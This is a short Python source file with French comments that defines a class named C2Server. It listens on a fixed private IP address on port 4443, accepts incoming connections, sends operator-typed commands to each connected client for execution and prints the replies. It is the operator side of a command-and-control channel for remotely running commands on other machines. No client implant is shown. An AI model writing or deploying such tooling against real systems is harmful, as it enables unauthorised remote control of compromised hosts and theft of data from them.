import socket

class C2Server:
    def __init__(self, host='10.102.252.40', port=4443):
        self.host = host
        self.port = port
        self.agents = {}  # Cet attribut est défini, mais non utilisé dans ce code
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"Serveur en écoute sur {self.host}:{self.port}...")

    def accept_connection(self):
        while True:
            client_socket, client_address = self.server_socket.accept()
            print(f"Connexion acceptée de {client_address}")
            command = ""
            while command != "exit":
                command = input("Entrez la commande que vous souhaitez exécuter sur le client : ").strip()
                if not command:
                    continue  # Ignorer les commandes vides

                # Envoi de la commande au client
                client_socket.sendall(command.encode('utf-8'))

                # Réception de la réponse du client
                client_response = client_socket.recv(4096).decode('utf-8', errors='replace')
                print(f"Réponse du client: {client_response}")

            client_socket.close()  # fermer la connexion avec le client avant d'accepter une nouvelle

    def close_server(self):
        self.server_socket.close()
        print("Serveur fermé.")

